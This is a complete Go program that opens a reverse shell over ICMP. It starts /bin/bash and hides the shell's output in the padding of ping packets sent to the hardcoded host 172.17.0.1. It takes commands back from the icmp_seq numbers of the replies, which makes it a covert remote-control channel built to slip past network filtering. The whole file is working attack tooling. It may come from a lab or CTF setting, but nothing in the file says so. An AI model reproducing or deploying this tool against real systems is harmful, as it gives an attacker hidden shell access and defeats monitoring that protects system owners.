package main

import (
	"encoding/hex"
	"fmt"
	"io"
	"os/exec"
	"regexp"
	"strconv"
	"sync"
)

const RHOST = "172.17.0.1"
const COMMAND = "/bin/bash"

var outQueue []byte
var outQueueLock sync.Mutex

var icmpSeqRegexp = regexp.MustCompile("icmp_seq=([0-9]+) ttl=")

var subCmd *exec.Cmd
var subCmdStdin io.WriteCloser

func main() {
	go sendloop()

	subCmd = exec.Command(COMMAND)

	subCmdStdin, _ = subCmd.StdinPipe()

	stderrPipe, _ := subCmd.StderrPipe()
	stdoutPipe, _ := subCmd.StdoutPipe()

	subCmd.Start()

	send([]byte("Shell popped!\n"), 14)

	go func() {
		buf := make([]byte, 16)
		for {
			len, err := stderrPipe.Read(buf)
			if err != nil {
				return
			}
			send(buf, len)
		}
	}()

	go func() {
		buf := make([]byte, 16)
		for {
			len, err := stdoutPipe.Read(buf)
			if err != nil {
				return
			}
			send(buf, len)
		}
	}()

	subCmd.Wait()
}

func send(data []byte, len int) {
	outQueueLock.Lock()
	outQueue = append(outQueue, data[:len]...)
	outQueueLock.Unlock()
}

func recv(data []byte) {
	subCmdStdin.Write(data)
}

func sendloop() {
	for {
		outQueueLock.Lock()
		var payloadHex string
		var payload []byte

		payloadLen := len(outQueue)
		if payloadLen > 15 {
			payloadLen = 15
		}
		if payloadLen > 0 {
			payload = outQueue[:payloadLen]
			outQueue = outQueue[payloadLen:]
		}
		outQueueLock.Unlock()

		if payloadLen <= 0 {
			payloadHex = "00"
		} else {
			payloadLenHex := fmt.Sprintf("%02x", payloadLen)
			payloadHex = payloadLenHex + hex.EncodeToString(payload)
			for len(payloadHex) < 32 {
				payloadHex += "00"
			}
		}

		cmd := exec.Command("ping", "-W", "1", "-c", "1", "-p", payloadHex, RHOST)
		out, err := cmd.CombinedOutput()
		if err != nil {
			if payloadLen > 0 {
				outQueueLock.Lock()
				outQueue = append(payload, outQueue...)
				outQueueLock.Unlock()
			}
			continue
		}

		match := icmpSeqRegexp.FindStringSubmatch(string(out))
		if match == nil {
			return
		}

		num, err := strconv.Atoi(match[1])
		if err == nil && num > 1000 {
			recv([]byte{byte(num - 1000)})
		}
	}
}
